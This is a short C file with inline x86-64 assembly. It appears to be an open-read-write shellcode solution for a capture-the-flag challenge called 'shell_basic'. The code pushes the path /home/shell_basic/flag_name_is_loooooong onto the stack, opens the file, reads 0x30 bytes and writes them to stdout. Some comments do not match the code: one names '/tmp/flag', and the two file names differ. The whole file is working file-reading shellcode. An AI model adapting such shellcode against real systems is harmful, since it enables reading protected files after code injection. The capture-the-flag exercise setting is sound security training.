// File name: shell_basic_ams.c
// Compile: gcc -o shell_basic_asm shell_basic_asm.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    
    "push 0x0\n"
    "mov rax, 0x676E6F6F6F6F6F6F \n"
    "push rax\n"
    "mov rax, 0x6C5F73695F656D61 \n"
    "push rax\n"
    "mov rax, 0x6E5F67616C662F63 \n"
    "push rax\n"
    "mov rax, 0x697361625F6C6C65 \n"
    "push rax\n"
    "mov rax, 0x68732F656D6F682F \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }